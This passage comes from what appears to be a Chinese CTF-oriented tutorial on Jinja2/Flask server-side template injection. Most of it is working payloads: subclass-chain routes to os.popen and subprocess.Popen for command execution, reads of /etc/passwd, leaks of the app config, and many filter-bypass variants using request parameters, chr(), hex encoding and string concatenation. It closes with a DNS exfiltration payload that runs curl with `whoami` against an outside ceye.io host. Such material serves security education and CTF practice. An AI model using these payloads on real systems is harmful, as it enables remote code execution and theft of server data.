+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> ().__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].open(<span class="string">&#x27;filename&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后这里再提一个比较少人提到的点</p>
+<p><code>warnings.catch_warnings</code>类在在内部定义了<code>_module=sys.modules[&#39;warnings&#39;]</code>，然后<code>warnings</code>模块包含有<code>__builtins__</code>，也就是说如果可以找到<code>warnings.catch_warnings</code>类，则可以不使用<code>globals</code>，payload如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">40</span>]()._module.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&quot;os&quot;</span>).popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>总而言之，原理都是先找到含有<code>__builtins__</code>的类，然后再进一步利用</p>
+<ul>
+<li><code>subprocess.Popen</code>进行RCE</li>
+</ul>
+<p>我们可以用<code>find2.py</code>寻找<code>subprocess.Popen</code>这个类，可以直接RCE，payload如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">258</span>](<span class="string">&#x27;whoami&#x27;</span>,shell=<span class="literal">True</span>,stdout=<span class="number">-1</span>).communicate()[<span class="number">0</span>].strip()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>直接利用<code>os</code></li>
+</ul>
+<p>一开始我以为这种方法只能用于python2，因为我在本地实验的时候python3中无法找到直接含有os的类，但后来发现python3其实也是能够用的，主要是环境里面有这个那个类才行</p>
+<p>我们把上面的<code>find.py</code>脚本中的search变量赋值为os，去寻找含有os的类</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">λ python find.py</span><br><span class="line">(&lt;class &#x27;site._Printer&#x27;&gt;, 69)</span><br><span class="line">(&lt;class &#x27;site.Quitter&#x27;&gt;, 74)</span><br></pre></td></tr></table></figure>
+
+<p>后面如法炮制，payload如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">69</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="获取配置信息"><a href="#获取配置信息" class="headerlink" title="获取配置信息"></a>获取配置信息</h3><p>我们有时候可以使用flask的内置函数比如说<code>url_for</code>，<code>get_flashed_messages</code>，甚至是内置的对象<code>request</code>来查询配置信息或者是构造payload</p>
+<ul>
+<li><code>config</code></li>
+</ul>
+<p>我们通常会用<code>&#123;&#123;config&#125;&#125;</code>查询配置信息，如果题目有设置类似<code>app.config [&#39;FLAG&#39;] = os.environ.pop(&#39;FLAG&#39;)</code>，就可以直接访问<code>&#123;&#123;config['FLAG']&#125;&#125;</code>或者<code>&#123;&#123;config.FLAG&#125;&#125;</code>获得flag</p>
+<ul>
+<li><code>request</code></li>
+</ul>
+<p>jinja2中存在对象<code>request</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Python <span class="number">3.7</span><span class="number">.8</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,render_template_string</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>request.__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">object</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>查询一些配置信息</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;request.application.__self__._get_data_for_json.__globals__[<span class="string">&#x27;json&#x27;</span>].JSONEncoder.default.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>构造ssti的payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;request.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].open(<span class="string">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;</span><br><span class="line">&#123;&#123;request.application.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].open(<span class="string">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>url_for</code></li>
+</ul>
+<p>查询配置信息</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>构造ssti的payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>get_flashed_messages</code></li>
+</ul>
+<p>查询配置信息</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;get_flashed_messages.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>构造ssti的payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;get_flashed_messages.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].eval(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="绕过黑名单"><a href="#绕过黑名单" class="headerlink" title="绕过黑名单"></a>绕过黑名单</h2><p>CTF中一般考的就是怎么绕过SSTI，我们学会如何去构造payload之后，还要学习如何去绕过一些过滤，然后下面由于环境的不同，payload中类的位置也是就那个数字可能会和文章中不一样，需要自己动手测一下</p>
+<h3 id="过滤了点"><a href="#过滤了点" class="headerlink" title="过滤了点"></a>过滤了点</h3><p>过滤了<code>.</code></p>
+<p>在python中，可用以下表示法可用于访问对象的属性</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__&#125;&#125;</span><br><span class="line">&#123;&#123;()[<span class="string">&quot;__class__&quot;</span>]&#125;&#125;</span><br><span class="line">&#123;&#123;()|attr(<span class="string">&quot;__class__&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;getattr(<span class="string">&#x27;&#x27;</span>,<span class="string">&quot;__class__&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>也就是说我们可以通过<code>[]</code>，<code>attr()</code>，<code>getattr()</code>来绕过点</p>
+<ul>
+<li>使用<code>[]</code>绕过</li>
+</ul>
+<p>使用访问字典的方式来访问函数或者类等，下面两行是等价的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__&#125;&#125;</span><br><span class="line">&#123;&#123;()[<span class="string">&#x27;__class__&#x27;</span>]&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>以此，我们可以构造payload如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()[<span class="string">&#x27;__class__&#x27;</span>][<span class="string">&#x27;__base__&#x27;</span>][<span class="string">&#x27;__subclasses__&#x27;</span>]()[<span class="number">433</span>][<span class="string">&#x27;__init__&#x27;</span>][<span class="string">&#x27;__globals__&#x27;</span>][<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;whoami&#x27;</span>)[<span class="string">&#x27;read&#x27;</span>]()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>使用<code>attr()</code>绕过</li>
+</ul>
+<p>使用原生JinJa2的函数<code>attr()</code>，以下两行是等价的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__&#125;&#125;</span><br><span class="line">&#123;&#123;()|attr(<span class="string">&#x27;__class__&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>以此，我们可以构造payload如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr(<span class="string">&#x27;__class__&#x27;</span>)|attr(<span class="string">&#x27;__base__&#x27;</span>)|attr(<span class="string">&#x27;__subclasses__&#x27;</span>)()|attr(<span class="string">&#x27;__getitem__&#x27;</span>)(<span class="number">65</span>)|attr(<span class="string">&#x27;__init__&#x27;</span>)|attr(<span class="string">&#x27;__globals__&#x27;</span>)|attr(<span class="string">&#x27;__getitem__&#x27;</span>)(<span class="string">&#x27;__builtins__&#x27;</span>)|attr(<span class="string">&#x27;__getitem__&#x27;</span>)(<span class="string">&#x27;eval&#x27;</span>)(<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>使用<code>getattr()</code>绕过</li>
+</ul>
+<p>这种方法有时候由于环境问题不一定可行，会报错<code>&#39;getattr&#39; is undefined</code>，所以优先使用以上两种</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Python <span class="number">3.7</span><span class="number">.8</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">tuple</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">getattr</span>(<span class="params">(<span class="params"></span>),<span class="string">&quot;__class__&quot;</span></span>)</span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">tuple</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a>过滤引号</h3><p>过滤了<code>&#39;</code>和<code>&quot;</code></p>
+<ul>
+<li><code>request</code>绕过</li>
+</ul>
+<p>flask中存在着<code>request</code>内置对象可以得到请求的信息，<code>request</code>可以用5种不同的方式来请求信息，我们可以利用他来传递参数绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">request.args.name</span><br><span class="line">request.cookies.name</span><br><span class="line">request.headers.name</span><br><span class="line">request.values.name</span><br><span class="line">request.form.name</span><br></pre></td></tr></table></figure>
+
+<p>payload如下</p>
+<p><code>GET</code>方式，利用<code>request.args</code>传递参数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">213</span>].__init__.__globals__.__builtins__[request.args.arg1](request.args.arg2).read()&#125;&#125;&amp;arg1=open&amp;arg2=/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><code>POST</code>方式，利用<code>request.values</code>传递参数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>].__init__.__globals__.__builtins__[request.values.arg1](request.values.arg2).read()&#125;&#125;</span><br><span class="line">post:arg1=open&amp;arg2=/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><code>Cookie</code>方式，利用<code>request.cookies</code>传递参数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>].__init__.__globals__.__builtins__[request.cookies.arg1](request.cookies.arg2).read()&#125;&#125;</span><br><span class="line">Cookie:arg1=open;arg2=/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>剩下两种方法也差不多，这里就不赘述了</p>
+<ul>
+<li>chr绕过</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[§<span class="number">0</span>§].__init__.__globals__.__builtins__.chr&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里先爆破<code>subclasses</code>，获取<code>subclasses</code>中含有chr的类索引</p>
+<p><img src="http://yuhaojiang.gitee.io/picture/%E7%BB%86%E8%AF%B4Jinja2%E4%B9%8BSSTI&bypass/image-20201127204834929.png" alt="image-20201127204834929"></p>
+<p>然后就可以用chr来绕过传参时所需要的引号，然后需要用chr来构造需要的字符</p>
+<p>这里我写了个脚本可以快速构造想要的ascii字符</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">&#x27;whoami&#x27;</span>;</span><br><span class="line">$result = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($a);$i++)</span><br><span class="line">&#123;</span><br><span class="line">	$result .= <span class="string">&#x27;chr(&#x27;</span>.ord($a[$i]).<span class="string">&#x27;)%2b&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> substr($result,<span class="number">0</span>,<span class="number">-3</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//chr(119)%2bchr(104)%2bchr(111)%2bchr(97)%2bchr(109)%2bchr(105)</span></span><br></pre></td></tr></table></figure>
+
+<p>最后payload如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set chr = ().__class__.__base__.__subclasses__()[<span class="number">7</span>].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">257</span>].__init__.__globals__.popen(chr(<span class="number">119</span>)%<span class="number">2</span>bchr(<span class="number">104</span>)%<span class="number">2</span>bchr(<span class="number">111</span>)%<span class="number">2</span>bchr(<span class="number">97</span>)%<span class="number">2</span>bchr(<span class="number">109</span>)%<span class="number">2</span>bchr(<span class="number">105</span>)).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="过滤下划线"><a href="#过滤下划线" class="headerlink" title="过滤下划线"></a>过滤下划线</h3><p>过滤了<code>_</code></p>
+<ul>
+<li>编码绕过</li>
+</ul>
+<p>使用十六进制编码绕过，<code>_</code>编码后为<code>\x5f</code>，<code>.</code>编码后为<code>\x2E</code></p>
+<p>payload如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()[<span class="string">&quot;\x5f\x5fclass\x5f\x5f&quot;</span>][<span class="string">&quot;\x5f\x5fbases\x5f\x5f&quot;</span>][<span class="number">0</span>][<span class="string">&quot;\x5f\x5fsubclasses\x5f\x5f&quot;</span>]()[<span class="number">376</span>][<span class="string">&quot;\x5f\x5finit\x5f\x5f&quot;</span>][<span class="string">&quot;\x5f\x5fglobals\x5f\x5f&quot;</span>][<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;whoami&#x27;</span>)[<span class="string">&#x27;read&#x27;</span>]()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里甚至可以全十六进制绕过，顺便把关键字也一起绕过，这里先给出个python脚本方便转换</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">string1=<span class="string">&quot;__class__&quot;</span></span><br><span class="line">string2=<span class="string">&quot;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tohex</span>(<span class="params">string</span>):</span></span><br><span class="line">  result = <span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> range(len(string)):</span><br><span class="line">      result=result+<span class="string">&quot;\\x&quot;</span>+hex(ord(string[i]))[<span class="number">2</span>:]</span><br><span class="line">  print(result)</span><br><span class="line"></span><br><span class="line">tohex(string1) <span class="comment">#\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f</span></span><br><span class="line">print(string2) <span class="comment">#__class__</span></span><br></pre></td></tr></table></figure>
+
+<p>随便构造个payload如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>[<span class="string">&quot;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&quot;</span>][<span class="string">&quot;\x5f\x5f\x62\x61\x73\x65\x5f\x5f&quot;</span>][<span class="string">&quot;\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f&quot;</span>]()[<span class="number">64</span>][<span class="string">&quot;\x5f\x5f\x69\x6e\x69\x74\x5f\x5f&quot;</span>][<span class="string">&quot;\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f&quot;</span>][<span class="string">&quot;\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f&quot;</span>][<span class="string">&quot;\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f&quot;</span>](<span class="string">&quot;\x6f\x73&quot;</span>)[<span class="string">&quot;\x70\x6f\x70\x65\x6e&quot;</span>](<span class="string">&quot;whoami&quot;</span>)[<span class="string">&quot;\x72\x65\x61\x64&quot;</span>]()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>request</code>绕过</li>
+</ul>
+<p>在上面的过滤引号已经介绍过了，这里不再赘述</p>
+<h3 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h3><p>首先要看关键字是如何被过滤的</p>
+<p>如果是替换为空，可以尝试双写绕过，或者使用黑名单逻辑漏洞错误绕过，即使用黑名单最后一个关键字替换绕过</p>
+<p>如果直接ban了，就可以使用字符串拼接的方式等方法进行绕过，常用方法如下</p>
+<ul>
+<li>拼接字符绕过</li>
+</ul>
+<p>这里以过滤class为例子，用中括号括起来然后里面用引号连接，可以用<code>+</code>号或者不用</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()[<span class="string">&#x27;__cla&#x27;</span>+<span class="string">&#x27;ss__&#x27;</span>].__bases__[<span class="number">0</span>]&#125;&#125;</span><br><span class="line">&#123;&#123;()[<span class="string">&#x27;__cla&#x27;</span><span class="string">&#x27;ss__&#x27;</span>].__bases__[<span class="number">0</span>]&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>随便写个payload如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()[<span class="string">&#x27;__cla&#x27;</span><span class="string">&#x27;ss__&#x27;</span>].__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;ev&#x27;</span><span class="string">&#x27;al&#x27;</span>](<span class="string">&quot;__im&quot;</span><span class="string">&quot;port__(&#x27;o&#x27;&#x27;s&#x27;).po&quot;</span><span class="string">&quot;pen(&#x27;whoami&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>或者可以使用join来进行拼接</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr([<span class="string">&quot;_&quot;</span>*<span class="number">2</span>,<span class="string">&quot;cla&quot;</span>,<span class="string">&quot;ss&quot;</span>,<span class="string">&quot;_&quot;</span>*<span class="number">2</span>]|join)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>看到有师傅甚至用管道符加上<code>format</code>方法来拼接的骚操作，也就是我们平时说的格式化字符串，其中的<code>%s</code>被<code>l</code>替换</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr(request.args.f|format(request.args.a))&#125;&#125;&amp;f=__c%sass__&amp;a=l</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>使用使用<code>str</code>原生函数</li>
+</ul>
+<p><code>replace</code>绕过，payload如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__getattribute__(<span class="string">&#x27;__claAss__&#x27;</span>.replace(<span class="string">&quot;A&quot;</span>,<span class="string">&quot;&quot;</span>)).__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">376</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>decode</code>绕过，但这种方法经过测试只能在python2下使用，payload如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__getattribute__(<span class="string">&#x27;X19jbGFzc19f&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)).__base__.__subclasses__()[<span class="number">40</span>](<span class="string">&quot;/etc/passwd&quot;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>替代的方法</li>
+</ul>
+<p>过滤init，可以用<code>__enter__</code>或<code>__exit__</code>替代</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">213</span>].__enter__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;open&#x27;</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">213</span>].__exit__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;open&#x27;</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>过滤config，我们通常会用<code>&#123;&#123;config&#125;&#125;</code>获取当前设置，如果被过滤了可以使用以下的payload绕过</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;self&#125;&#125; ⇒ &lt;TemplateReference <span class="literal">None</span>&gt;</span><br><span class="line">&#123;&#123;self.__dict__._TemplateReference__context&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="过滤中括号"><a href="#过滤中括号" class="headerlink" title="过滤中括号"></a>过滤中括号</h3><p>过滤了<code>[</code>和<code>]</code></p>
+<ul>
+<li>数字中的中括号</li>
+</ul>
+<p>在python里面可以使用以下方法访问数组元素</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Python <span class="number">3.7</span><span class="number">.8</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[<span class="string">&quot;a&quot;</span>,<span class="string">&quot;kawhi&quot;</span>,<span class="string">&quot;c&quot;</span>][<span class="number">1</span>]</span><br><span class="line"><span class="string">&#x27;kawhi&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[<span class="string">&quot;a&quot;</span>,<span class="string">&quot;kawhi&quot;</span>,<span class="string">&quot;c&quot;</span>].pop(<span class="number">1</span>)</span><br><span class="line"><span class="string">&#x27;kawhi&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[<span class="string">&quot;a&quot;</span>,<span class="string">&quot;kawhi&quot;</span>,<span class="string">&quot;c&quot;</span>].__getitem__(<span class="number">1</span>)</span><br><span class="line"><span class="string">&#x27;kawhi&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>也就是说可以使用<code>__getitem__</code>和<code>pop</code>替代中括号，取列表的第n位</p>
+<p>payload如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().__getitem__(<span class="number">433</span>).__init__.__globals__.popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__base__.__subclasses__().pop(<span class="number">433</span>).__init__.__globals__.popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>魔术方法的中括号</li>
+</ul>
+<p>调用魔术方法本来是不用中括号的，但是如果过滤了关键字，要进行拼接的话就不可避免要用到中括号，像这里如果同时过滤了class和中括号</p>
+<p>可用<code>__getattribute__</code>绕过</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__getattribute__(<span class="string">&quot;__cla&quot;</span>+<span class="string">&quot;ss__&quot;</span>).__base__&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>或者可以配合<code>request</code>一起使用</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__getattribute__(request.args.arg1).__base__&#125;&#125;&amp;arg1=__class__</span><br></pre></td></tr></table></figure>
+
+<p>payload如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__getattribute__(request.args.arg1).__base__.__subclasses__().pop(<span class="number">376</span>).__init__.__globals__.popen(request.args.arg2).read()&#125;&#125;&amp;arg1=__class__&amp;arg2=whoami</span><br></pre></td></tr></table></figure>
+
+<p>这种同样是绕过关键字的方法之一</p>
+<h3 id="过滤双大括号"><a href="#过滤双大括号" class="headerlink" title="过滤双大括号"></a>过滤双大括号</h3><p>过滤了<code>&#123;&#123;&#125;&#125;`
+
+- 使用dns外带数据
+
+用`&#123;%%&#125;`替代了`&#123;&#123;&#125;&#125;</code>，使用判断语句进行dns外带数据</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">if</span> ().__class__.__base__.__subclasses__()[<span class="number">433</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&quot;curl `whoami`.k1o75b.ceye.io&quot;</span>).read()==<span class="string">&#x27;kawhi&#x27;</span> %&#125;<span class="number">1</span>&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后在ceye平台接收数据即可</p>
